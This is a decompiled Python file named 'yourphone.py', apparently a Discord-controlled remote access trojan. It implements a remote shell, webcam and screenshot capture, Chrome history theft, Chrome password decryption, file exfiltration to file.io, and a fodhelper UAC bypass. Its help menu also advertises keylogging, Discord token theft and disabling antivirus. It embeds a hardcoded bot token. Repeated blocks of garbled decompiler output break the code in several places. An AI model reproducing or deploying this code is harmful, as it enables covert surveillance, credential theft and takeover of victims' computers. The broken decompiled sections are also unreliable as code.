# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: yourphone.py
# Bytecode version: 3.8.0rc1+ (3413)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

global appdata  # inserted
import winreg
import ctypes
import sys
import os
import ssl
import random
import threading
import time
import cv2
import subprocess
import discord
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from discord.ext import commands
from ctypes import *
import asyncio
import discord
from discord import utils
token = 'ODk0MTY3ODU1MjIwNzkzMzc0.YVmEtQ.VI1XHUw_mU1O5tMrotrkkY0N35w'
appdata = os.getenv('APPDATA')
client = discord.Client()
bot = commands.Bot(command_prefix='!')
ssl._create_default_https_context = ssl._create_unverified_context
helpmenu = '\nAvailaible commands are :\n--> !message = Show a message box displaying your text / Syntax  = \"!message example\"\n--> !shell = Execute a shell command /Syntax  = \"!shell whoami\"\n--> !webcampic = Take a picture from the webcam\n--> !windowstart = Start logging current user window (logging is shown in the bot activity)\n--> !windowstop = Stop logging current user window \n--> !voice = Make a voice say outloud a custom sentence / Syntax = \"!voice test\"\n--> !admincheck = Check if program has admin privileges\n--> !sysinfo = Gives info about infected computer\n--> !history = Get chrome browser history\n--> !download = Download a file from infected computer\n--> !upload = Upload file to the infected computer / Syntax = \"!upload file.png\" (with attachment)\n--> !cd = Changes directory\n--> !delete = deletes a file / Syntax = \"!delete /path to/the/file.txt\"\n--> !write = Type your desired sentence on computer / Type \"enter\" to press the enter button on the computer\n--> !wallpaper = Change infected computer wallpaper / Syntax = \"!wallpaper\" (with attachment)\n--> !clipboard = Retrieve infected computer clipboard content\n--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise\n--> !startkeylogger = Starts a keylogger\n--> !stopkeylogger = Stops keylogger\n--> !dumpkeylogger = Dumps the keylog\n--> !volumemax = Put volume to max\n--> !volumezero = Put volume at 0\n--> !idletime = Get the idle time of user\'s on target computer\n--> !blockinput = Blocks user\'s keyboard and mouse / Warning : Admin rights are required\n--> !unblockinput = Unblocks user\'s keyboard and mouse / Warning : Admin rights are required\n--> !screenshot = Get the screenshot of the user\'s current screen\n--> !exit = Exit program\n--> !kill = Kill a session or all sessions / Syntax = \"!kill session-3\" or \"!kill all\"\n--> !uacbypass = attempt to bypass uac to gain admin by using fod helper\n--> !passwords = grab all chrome passwords\n--> !streamwebcam = streams webcam by sending multiple pictures\n--> !stopwebcam = stop webcam stream\n--> !getdiscordinfo = get discord token,email,phone number,etc\n--> !streamscreen = stream screen by sending multiple pictures\n--> !stopscreen = stop screen stream\n--> !shutdown = shutdown computer\n--> !restart = restart computer\n--> !logoff = log off current user\n--> !bluescreen = BlueScreen PC\n--> !displaydir = display all items in current dir\n--> !currentdir = display the current dir\n--> !dateandtime = display system date and time\n--> !prockill = kill a process by name / syntax = \"!kill process.exe\"\n--> !recscreen = record screen for certain amount of time / syntax = \"!recscreen 10\"\n--> !reccam = record camera for certain amount of time / syntax = \"!reccam 10\"\n--> !recaudio = record audio for certain amount of time / syntax = \"!recaudio 10\"\n--> !disableantivirus = permanently disable windows defender(requires admin)\n--> !disablefirewall = disable windows firewall (requires admin)\n--> !audio = play a audio file on the target computer(.wav only) / Syntax = \"!audio\" (with attachment)\n--> !selfdestruct = delete all traces that this program was on the target PC\n--> !windowspass = attempt to phish password by poping up a password dialog\n--> !displayoff = turn off the monitor(Admin rights are required)\n--> !displayon = turn on the monitors(Admin rights are required)\n--> !hide = hide the file by changing the attribute to hidden\n--> !unhide = unhide the file the removing the attribute to make it unhidden\n--> !ejectcd = eject the cd drive on computer\n--> !retractcd = retract the cd drive on the computer\n--> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)\n--> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)\n--> !website = open a website on the infected computer / syntax = \"!website google.com\" or \"!website www.google.com\"\n--> !distaskmgr = disable task manager(Admin rights are required)\n--> !enbtaskmgr = enable task manager(if disabled)(Admin rights are required)\n--> !getwifipass = get all the wifi passwords on the current device(Admin rights are required)\n--> !startup = add file to startup(when computer go on this file starts)(Admin rights are required)\n'

async def activity(client):
    import time
    import win32gui
    while True:  # inserted
        while stop_threads:
            break
        else:  # inserted
            current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            window_displayer = discord.Game(f'Visiting: {current_window}')
            await client.change_presence(status=discord.Status.online, activity=window_displayer)
            time.sleep(1)

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

@client.event
async def on_ready():
    global channel_name  # inserted
    global number  # inserted
    import platform
    import re
    import urllib.request
    import json
    with urllib.request.urlopen('https://geolocation-db.com/json') as url:
        data = json.loads(url.read().decode())
        flag = data['country_code']
        ip = data['IPv4']
        <mask_0>.ODk0MTY3ODU1MjIwNzkzMzc0.YVmEtQ.VI1XHUw_mU1O5tMrotrkkY0N35w('_Selector__preGet', None, (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' if f'{None}' if f'{None}' if f'{None}' is not None))))))
    else:  # inserted
        if not (446, 447, 448, 449, 440):
            def AudioUtilities(commands, *, *: <Code38 code object uncritproc at 0x73a68e52fe50, file yourphone.py>, line 173, utils: <mask_18>, command_prefix: <Code38 code object on_message at 0x73a68e52d590, file yourphone.py>, line 177, winreg: <mask_20>, ctypes: CLSCTX_ALL, sys: CLSCTX_ALL, os: CLSCTX_ALL, ssl: CLSCTX_ALL, random: CLSCTX_ALL, threading: CLSCTX_ALL, time: CLSCTX_ALL, cv2: CLSCTX_ALL, subprocess: CLSCTX_ALL, discord: CLSCTX_ALL, comtypes: CLSCTX_ALL, pycaw.pycaw: CLSCTX_ALL, discord.ext: CLSCTX_ALL, asyncio: CLSCTX_ALL, token: CLSCTX_ALL, getenv: CLSCTX_ALL, appdata: CLSCTX_ALL, Client: CLSCTX_ALL, client: CLSCTX_ALL, Bot: CLSCTX_ALL, bot: CLSCTX_ALL, _create_unverified_context: CLSCTX_ALL, _create_default_https_context: CLSCTX_ALL,helpmenu: CLSCTX_ALL, event: CLSCTX_ALL, run: CLSCTX_ALL, <module>: CLSCTX_ALL, <mask_56>: CLSCTX_ALL, Visiting: : CLSCTX_ALL, <mask_58>: CLSCTX_ALL, <mask_59>:CLSCTX_ALL, <mask_60>:CLSCTX_ALL, win32gui: CLSCTX_ALL, stop_threads:CLSCTX_ALL, GetWindowText:CLSCTX_ALL, GetForegroundWindow: CLSCTX_ALL, Game: CLSCTX_ALL, change_presence:
                pass  # postinserted
    except:
        except:
            pass  # postinserted
    import os
    total = []
    number = 0
    channel_name = None
    for x in client.get_all_channels():
        total.append(x.name)
    for y in range(len(total)):
        if 'session' % total[y] < 500> and (not <Code38 code object between_callback at 0x73a6fab20450, file yourphone.py>, line 106):
            import re
            result = [e for e in re.split('[^0-9]', total[y]) if e!= '']
            biggest = max(map(int, result))
            number = biggest + 1
            continue
    if number == 0:
        channel_name = 'session-1'
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    else:  # inserted
        channel_name = f'session-{number}'
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
    value1 = f'@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} |  :flag_{flag.lower()}: | User : {os.getlogin()}'
    if is_admin == True:
        await channel.send(f'{value1} | admin!')
    else:  # inserted
        if is_admin == False:
            await channel.send(value1)
    game = discord.Game('Window logging stopped')
    await client.change_presence(status=discord.Status.online, activity=game)

def volumeup():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def volumedown():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)

def critproc():
    import ctypes
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0

def uncritproc():
    import ctypes
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0

@client.event
async def on_message(message):
    global statue  # inserted
    global idle1  # inserted
    global stop_threads  # inserted
    global statusuusss  # inserted
    global status  # inserted
    global statuuusss  # inserted
    global _thread  # inserted
    if message.channel.name!= channel_name:
        pass
    else:  # inserted
        total = []
        for x in client.get_all_channels():
            total.append(x.name)
        if message.content.startswith('!kill'):
            try:
                if message.content[6:] == 'all':
                    for y in range(len(total)):
                        if 'session' % total[y] < 500> and (not <Code38 code object between_callback at 0x73a6fab20450, file yourphone.py>, line 106):
                            channel_to_delete = discord.utils.get(client.get_all_channels(), name=total[y])
                            await channel_to_delete.delete()
                            continue
                else:  # inserted
                    channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
                    await channel_to_delete.delete()
                    await message.channel.send(f'[*] {message.content[6:]} killed.')
            except:
                await message.channel.send(f'[!] {message.content[6:]} is invalid,please enter a valid session name')
        if message.content == '!exit':
            import sys
            uncritproc()
            sys.exit()
        if message.content == '!windowstart':
            import threading
            stop_threads = False
            _thread = threading.Thread(target=between_callback, args=(client,))
            _thread.start()
            await message.channel.send('[*] Window logging for this session started')
        if message.content == '!windowstop':
            stop_threads = True
            await message.channel.send('[*] Window logging for this session stopped')
            game = discord.Game('Window logging stopped')
            await client.change_presence(status=discord.Status.online, activity=game)
        if message.content == '!screenshot':
            import os
            from mss import mss
            with mss() as sct:
                sct.shot(output=os.path.join(os.getenv('TEMP') + '\\monitor.png'))
                <mask_0>.ODk0MTY3ODU1MjIwNzkzMzc0.YVmEtQ.VI1XHUw_mU1O5tMrotrkkY0N35w('_Selector__preGet', None, (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' if f'{None}' if f'{None}' if f'{None}' is not None))))))
            else:  # inserted
                if not (446, 447, 448, 449, 440):
                    def AudioUtilities(commands, *, *: <Code38 code object uncritproc at 0x73a68e52fe50, file yourphone.py>, line 173, utils: <mask_18>, command_prefix: <Code38 code object on_message at 0x73a68e52d590, file yourphone.py>, line 177, winreg: <mask_20>, ctypes: CLSCTX_ALL, sys: CLSCTX_ALL, os: CLSCTX_ALL, ssl: CLSCTX_ALL, random: CLSCTX_ALL, threading: CLSCTX_ALL, time: CLSCTX_ALL, cv2: CLSCTX_ALL, subprocess: CLSCTX_ALL, discord: CLSCTX_ALL, comtypes: CLSCTX_ALL, pycaw.pycaw: CLSCTX_ALL, discord.ext: CLSCTX_ALL, asyncio: CLSCTX_ALL, token: CLSCTX_ALL, getenv: CLSCTX_ALL, appdata: CLSCTX_ALL, Client: CLSCTX_ALL, client: CLSCTX_ALL, Bot: CLSCTX_ALL, bot: CLSCTX_ALL, _create_unverified_context: CLSCTX_ALL, _create_default_https_context: CLSCTX_ALL,helpmenu: CLSCTX_ALL, event: CLSCTX_ALL, run: CLSCTX_ALL, <module>: CLSCTX_ALL, <mask_56>: CLSCTX_ALL, Visiting: : CLSCTX_ALL, <mask_58>: CLSCTX_ALL, <mask_59>:CLSCTX_ALL, <mask_60>:CLSCTX_ALL, win32gui: CLSCTX_ALL, stop_threads:CLSCTX_ALL, GetWindowText:CLSCTX_ALL, GetForegroundWindow: CLSCTX_ALL, Game: CLSCTX_ALL, change_presence:
                        pass  # postinserted
            except:
                except:
                    pass  # postinserted
            path = os.getenv('TEMP') + '\\monitor.png'
            file = discord.File(path, filename='monitor.png')
            await message.channel.send('[*] Command successfuly executed', file=file)
            os.remove(path)
        if message.content == '!volumemax':
            volumeup()
            await message.channel.send('[*] Volume put to 100%')
        if message.content == '!volumezero':
            volumedown()
            await message.channel.send('[*] Volume put to 0%')
        if message.content == '!webcampic':
            import os, time, cv2
            temp = os.getenv('TEMP')
            camera_port = 0
            camera = cv2.VideoCapture(camera_port)
            return_value, image = camera.read()
            cv2.imwrite(temp + '\\temp.png', image)
            del camera
            file = discord.File(temp + '\\temp.png', filename='temp.png')
            await message.channel.send('[*] Command successfuly executed', file=file)
        if message.content.startswith('!message'):
            import ctypes
            import time
            MB_YESNO = 4
            MB_HELP = 16384
            ICON_STOP = 16

            def mess():
                ctypes.windll.user32.MessageBoxW(0, message.content[8:], 'Error', MB_HELP | MB_YESNO | ICON_STOP)
            import threading
            messa = threading.Thread(target=mess)
            messa._running = True
            messa.daemon = True
            messa.start()
            import win32con, win32gui

            def get_all_hwnd(hwnd, mouse):
                def winEnumHandler(hwnd, ctx):
                    if win32gui.GetWindowText(hwnd) == 'Error':
                        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                        win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                        win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                        win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                        return
                if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                    win32gui.EnumWindows(winEnumHandler, None)
            win32gui.EnumWindows(get_all_hwnd, 0)
        if message.content.startswith('!wallpaper'):
            import ctypes, os
            path = os.path.join(os.getenv('TEMP') + '\\temp.jpg')
            await message.attachments[0].save(path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
            await message.channel.send('[*] Command successfuly executed')
        if message.content.startswith('!upload'):
            await message.attachments[0].save(message.content[8:])
            await message.channel.send('[*] Command successfuly executed')
        if message.content.startswith('!shell'):
            import time
            status = None
            import subprocess, os
            instruction = message.content[7:]

            def shell():
                global status  # inserted
                output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                status = 'ok'
                return output
            import threading
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            if status:
                result = str(shell().stdout.decode('CP437'))
                numb = len(result)
                if numb < 1:
                    await message.channel.send('[*] Command not recognized or no output was obtained')
                else:  # inserted
                    if numb > 1990:
                        temp = os.getenv('TEMP')
                        f1 = open(temp + '\\output.txt', 'a')
                        f1.write(result)
                        f1.close()
                        file = discord.File(temp + '\\output.txt', filename='output.txt')
                        await message.channel.send('[*] Command successfuly executed', file=file)
                        dele = 'del' + temp + '\\output.txt'
                        os.popen(dele)
                    else:  # inserted
                        await message.channel.send('[*] Command successfuly executed : ' + result)
            else:  # inserted
                await message.channel.send('[*] Command not recognized or no output was obtained')
                status = None
        if message.content.startswith('!download'):
            import subprocess, os
            filename = message.content[10:]
            check2 = os.stat(filename).st_size
            if check2 > 7340032:
                instruction = 'curl -F file=@\"' + filename + '\"' + ' https://file.io/?expires=1w'
                await message.channel.send('this may take some time becuase it is over 8 MB. please wait')
                string = subprocess.getoutput(instruction)
                import re
                output = re.search('key', string).start()
                output = output + 6
                output2 = output + 12
                boom = string[output:output2]
                boom = 'https://file.io/' + boom
                await message.channel.send('download link: ' + boom)
                await message.channel.send('[*] Command successfuly executed')
            else:  # inserted
                file = discord.File(message.content[10:], filename=message.content[10:])
                await message.channel.send('[*] Command successfuly executed', file=file)
        if message.content.startswith('!cd'):
            import os
            os.chdir(message.content[4:])
            await message.channel.send('[*] Command successfuly executed')
        if message.content == '!help':
            import os
            temp = os.getenv('TEMP')
            f5 = open(temp + '\\helpmenu.txt', 'a')
            f5.write(str(helpmenu))
            f5.close()
            temp = os.getenv('TEMP')
            file = discord.File(temp + '\\helpmenu.txt', filename='helpmenu.txt')
            await message.channel.send('[*] Command successfuly executed', file=file)
            os.system('del %temp%\\helpmenu.txt /f')
        if message.content.startswith('!write'):
            import pyautogui
            if message.content[7:] == 'enter':
                pyautogui.press('enter')
            else:  # inserted
                pyautogui.typewrite(message.content[7:])
        if message.content == '!history':
            import sqlite3, os, time, shutil
            temp = os.getenv('TEMP')
            Username = os.getenv('USERNAME')
            shutil.rmtree(temp + '\\history12', ignore_errors=True)
            os.mkdir(temp + '\\history12')
            path_org = ' \"C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\" '.format(Username)
            path_new = temp + '\\history12'
            copy_me_to_here = ('copy' + path_org + '\"{}\"').format(path_new)
            os.system(copy_me_to_here)
            con = sqlite3.connect(path_new + '\\history')
            cursor = con.cursor()
            cursor.execute('SELECT url FROM urls')
            urls = cursor.fetchall()
            for x in urls:
                done = ''.join(x)
                f4 = open(temp + '\\history12' + '\\history.txt', 'a')
                f4.write(str(done))
                f4.write(str('\n'))
                f4.close()
            con.close()
            file = discord.File(temp + '\\history12' + '\\history.txt', filename='history.txt')
            await message.channel.send('[*] Command successfuly executed', file=file)

            def deleteme():
                path = 'rmdir ' + temp + '\\history12' + ' /s /q'
                os.system(path)
            deleteme()
        if message.content == '!clipboard':
            import ctypes
            import os
            CF_TEXT = 1
            kernel32 = ctypes.windll.kernel32
            kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
            kernel32.GlobalLock.restype = ctypes.c_void_p
            kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
            user32 = ctypes.windll.user32
            user32.GetClipboardData.restype = ctypes.c_void_p
            user32.OpenClipboard(0)
            if user32.IsClipboardFormatAvailable(CF_TEXT):
                data = user32.GetClipboardData(CF_TEXT)
                data_locked = kernel32.GlobalLock(data)
                text = ctypes.c_char_p(data_locked)
                value = text.value
                kernel32.GlobalUnlock(data_locked)
                body = value.decode()
                user32.CloseClipboard()
                await message.channel.send('[*] Command successfuly executed : Clipboard content is : ' + str(body))
        if message.content == '!sysinfo':
            import platform
            jak = str(platform.uname())
            intro = jak[12:]
            from requests import get
            ip = get('https://api.ipify.org').text
            pp = 'IP Address = ' + ip
            await message.channel.send('[*] Command successfuly executed : ' + intro + pp)
        if message.content == '!geolocate':
            import urllib.request
            import json
            with urllib.request.urlopen('https://geolocation-db.com/json') as url:
                data = json.loads(url.read().decode())
                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                await message.channel.send('[*] Command successfuly executed : ' + link)
                <mask_0>.ODk0MTY3ODU1MjIwNzkzMzc0.YVmEtQ.VI1XHUw_mU1O5tMrotrkkY0N35w('_Selector__preGet', None, (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' if f'{None}' if f'{None}' if f'{None}' is not None))))))
            else:  # inserted
                if not (446, 447, 448, 449, 440):
                    def AudioUtilities(commands, *, *: <Code38 code object uncritproc at 0x73a68e52fe50, file yourphone.py>, line 173, utils: <mask_18>, command_prefix: <Code38 code object on_message at 0x73a68e52d590, file yourphone.py>, line 177, winreg: <mask_20>, ctypes: CLSCTX_ALL, sys: CLSCTX_ALL, os: CLSCTX_ALL, ssl: CLSCTX_ALL, random: CLSCTX_ALL, threading: CLSCTX_ALL, time: CLSCTX_ALL, cv2: CLSCTX_ALL, subprocess: CLSCTX_ALL, discord: CLSCTX_ALL, comtypes: CLSCTX_ALL, pycaw.pycaw: CLSCTX_ALL, discord.ext: CLSCTX_ALL, asyncio: CLSCTX_ALL, token: CLSCTX_ALL, getenv: CLSCTX_ALL, appdata: CLSCTX_ALL, Client: CLSCTX_ALL, client: CLSCTX_ALL, Bot: CLSCTX_ALL, bot: CLSCTX_ALL, _create_unverified_context: CLSCTX_ALL, _create_default_https_context: CLSCTX_ALL,helpmenu: CLSCTX_ALL, event: CLSCTX_ALL, run: CLSCTX_ALL, <module>: CLSCTX_ALL, <mask_56>: CLSCTX_ALL, Visiting: : CLSCTX_ALL, <mask_58>: CLSCTX_ALL, <mask_59>:CLSCTX_ALL, <mask_60>:CLSCTX_ALL, win32gui: CLSCTX_ALL, stop_threads:CLSCTX_ALL, GetWindowText:CLSCTX_ALL, GetForegroundWindow: CLSCTX_ALL, Game: CLSCTX_ALL, change_presence:
                        pass  # postinserted
            except:
                except:
                    pass  # postinserted
        if message.content == '!admincheck':
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
            if is_admin == True:
                await message.channel.send('[*] Congrats you\'re admin')
            else:  # inserted
                if is_admin == False:
                    await message.channel.send('[!] Sorry, you\'re not admin')
        if message.content == '!uacbypass':
            import winreg, ctypes, sys, os, time, inspect

            def isAdmin():
                try:
                    is_admin = os.getuid() == 0
                else:  # inserted
                    AttributeError:
                        pass  # postinserted
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
                finally:  # inserted
                    return is_admin
            if isAdmin():
                await message.channel.send('Your already admin!')
            else:  # inserted
                await message.channel.send('attempting to get admin!')
                if message.content == '!uacbypass':
                    uncritproc()
                    test_str = sys.argv[0]
                    current_dir = inspect.getframeinfo(inspect.currentframe()).filename
                    cmd2 = current_dir
                    create_reg_path = ' powershell New-Item \"HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command\" -Force '
                    os.system(create_reg_path)
                    create_trigger_reg_key = ' powershell New-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"hi\" -Force '
                    os.system(create_trigger_reg_key)
                    create_payload_reg_key = 'powershell Set-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"`(Default`)\" -Value \"\'cmd /c start python \"\"\"\"' + cmd2 + '\"\"' + '\"' + '\"\'\"' + ' -Force'
                    os.system(create_payload_reg_key)

                class disable_fsr:
                    disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                    revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection

                    def __enter__(self):
                        self.old_value = ctypes.c_long()
                        self.success = self.disable(ctypes.byref(self.old_value))

                    def __exit__(self, type, value, traceback):
                        if self.success:
                            self.revert(self.old_value)
                with disable_fsr():
                    os.system('fodhelper.exe')
                    <mask_0>.ODk0MTY3ODU1MjIwNzkzMzc0.YVmEtQ.VI1XHUw_mU1O5tMrotrkkY0N35w('_Selector__preGet', None, (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' if f'{None}' if f'{None}' if f'{None}' is not None))))))
                else:  # inserted
                    if not (446, 447, 448, 449, 440):
                        def AudioUtilities(commands, *, *: <Code38 code object uncritproc at 0x73a68e52fe50, file yourphone.py>, line 173, utils: <mask_18>, command_prefix: <Code38 code object on_message at 0x73a68e52d590, file yourphone.py>, line 177, winreg: <mask_20>, ctypes: CLSCTX_ALL, sys: CLSCTX_ALL, os: CLSCTX_ALL, ssl: CLSCTX_ALL, random: CLSCTX_ALL, threading: CLSCTX_ALL, time: CLSCTX_ALL, cv2: CLSCTX_ALL, subprocess: CLSCTX_ALL, discord: CLSCTX_ALL, comtypes: CLSCTX_ALL, pycaw.pycaw: CLSCTX_ALL, discord.ext: CLSCTX_ALL, asyncio: CLSCTX_ALL, token: CLSCTX_ALL, getenv: CLSCTX_ALL, appdata: CLSCTX_ALL, Client: CLSCTX_ALL, client: CLSCTX_ALL, Bot: CLSCTX_ALL, bot: CLSCTX_ALL, _create_unverified_context: CLSCTX_ALL, _create_default_https_context: CLSCTX_ALL,helpmenu: CLSCTX_ALL, event: CLSCTX_ALL, run: CLSCTX_ALL, <module>: CLSCTX_ALL, <mask_56>: CLSCTX_ALL, Visiting: : CLSCTX_ALL, <mask_58>: CLSCTX_ALL, <mask_59>:CLSCTX_ALL, <mask_60>:CLSCTX_ALL, win32gui: CLSCTX_ALL, stop_threads:CLSCTX_ALL, GetWindowText:CLSCTX_ALL, GetForegroundWindow: CLSCTX_ALL, Game: CLSCTX_ALL, change_presence:
                            pass  # postinserted
                except:
                    except:
                        pass  # postinserted
                time.sleep(2)
                remove_reg = ' powershell Remove-Item \"HKCU:\\Software\\Classes\\ms-settings\" -Recurse -Force '
                os.system(remove_reg)
        if message.content == '!idletime':
            class LASTINPUTINFO(Structure):
                _fields_ = [('cbSize', c_uint), ('dwTime', c_int)]

            def get_idle_duration():
                lastInputInfo = LASTINPUTINFO()
                lastInputInfo.cbSize = sizeof(lastInputInfo)
                if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
                    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                    return millis / 1000.0
                return 0
            import threading
            idle1 = threading.Thread(target=get_idle_duration)
            idle1._running = True
            idle1.daemon = True
            idle1.start()
            duration = get_idle_duration()
            await message.channel.send('User idle for %.2f seconds.' % duration)
            import time
            time.sleep(1)
        if message.content.startswith('!voice'):
            volumeup()
            import win32com.client as wincl
            speak = wincl.Dispatch('SAPI.SpVoice')
            speak.Speak(message.content[7:])
            await message.channel.send('[*] Command successfuly executed')
        if message.content.startswith('!blockinput'):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
            if is_admin == True:
                ok = windll.user32.BlockInput(True)
                await message.channel.send('[*] Command successfuly executed')
            else:  # inserted
                await message.channel.send('[!] Admin rights are required for this operation')
        if message.content.startswith('!unblockinput'):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()!= 0
            if is_admin == True:
                ok = windll.user32.BlockInput(False)
                await message.channel.send('[*] Command successfuly executed')
            else:  # inserted
                await message.channel.send('[!] Admin rights are required for this operation')
        if message.content == '!passwords':
            import os, json, base64, sqlite3, win32crypt
            from Cryptodome.Cipher import AES
            import shutil

            def get_master_key():
                with open(os.environ['USERPROFILE'] + os.sep + 'AppData\\Local\\Google\\Chrome\\User Data\\Local State', 'r') as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                    <mask_0>.ODk0MTY3ODU1MjIwNzkzMzc0.YVmEtQ.VI1XHUw_mU1O5tMrotrkkY0N35w('_Selector__preGet', None, (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' if f'{None}' if f'{None}' if f'{None}' is not None))))))
                else:  # inserted
                    if not (446, 447, 448, 449, 440):
                        def AudioUtilities(commands, *, *: <Code38 code object uncritproc at 0x73a68e52fe50, file yourphone.py>, line 173, utils: <mask_18>, command_prefix: <Code38 code object on_message at 0x73a68e52d590, file yourphone.py>, line 177, winreg: <mask_20>, ctypes: CLSCTX_ALL, sys: CLSCTX_ALL, os: CLSCTX_ALL, ssl: CLSCTX_ALL, random: CLSCTX_ALL, threading: CLSCTX_ALL, time: CLSCTX_ALL, cv2: CLSCTX_ALL, subprocess: CLSCTX_ALL, discord: CLSCTX_ALL, comtypes: CLSCTX_ALL, pycaw.pycaw: CLSCTX_ALL, discord.ext: CLSCTX_ALL, asyncio: CLSCTX_ALL, token: CLSCTX_ALL, getenv: CLSCTX_ALL, appdata: CLSCTX_ALL, Client: CLSCTX_ALL, client: CLSCTX_ALL, Bot: CLSCTX_ALL, bot: CLSCTX_ALL, _create_unverified_context: CLSCTX_ALL, _create_default_https_context: CLSCTX_ALL,helpmenu: CLSCTX_ALL, event: CLSCTX_ALL, run: CLSCTX_ALL, <module>: CLSCTX_ALL, <mask_56>: CLSCTX_ALL, Visiting: : CLSCTX_ALL, <mask_58>: CLSCTX_ALL, <mask_59>:CLSCTX_ALL, <mask_60>:CLSCTX_ALL, win32gui: CLSCTX_ALL, stop_threads:CLSCTX_ALL, GetWindowText:CLSCTX_ALL, GetForegroundWindow: CLSCTX_ALL, Game: CLSCTX_ALL, change_presence:
                            pass  # postinserted
                except:
                    except:
                        pass  # postinserted
                master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                master_key = master_key[5:]
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key

            def decrypt_payload(cipher, payload):
                return cipher.decrypt(payload)

            def generate_cipher(aes_key, iv):
                return AES.new(aes_key, AES.MODE_GCM, iv)

            def decrypt_password(buff, master_key):
                try:
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = generate_cipher(master_key, iv)
                    decrypted_pass = decrypt_payload(cipher, payload)
                    decrypted_pass = decrypted_pass[:(-16)].decode()
                    return decrypted_pass
                else:  # inserted
                    Exception as e:
                        e = None
                        return 'Chrome < 80' if e == None else None
            master_key = get_master_key()
            login_db = os.environ['USERPROFILE'] + os.sep + 'AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data'
            shutil.copy2(login_db, 'Loginvault.db')
            conn = sqlite3.connect('Loginvault.db')
            cursor = conn.cursor()
            try:
                cursor.execute('SELECT action_url, username_value, password_value FROM logins')
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = decrypt_password(encrypted_password, master_key)
                    if len(username) > 0:
                        temp = os.getenv('TEMP')
                        output = 'URL: ' + url + '\nUser Name: ' + username + '\nPassword: ' + decrypted_password + '\n' + '**************************************************' + '\n'
                        f4 = open(temp + '\\passwords.txt', 'a')
                        f4.write(str(output))
                        f4.close()
            else:  # inserted
                Exception as e:
                    pass
                finally:  # inserted
                    cursor.close()
                    conn.close()
                    try:
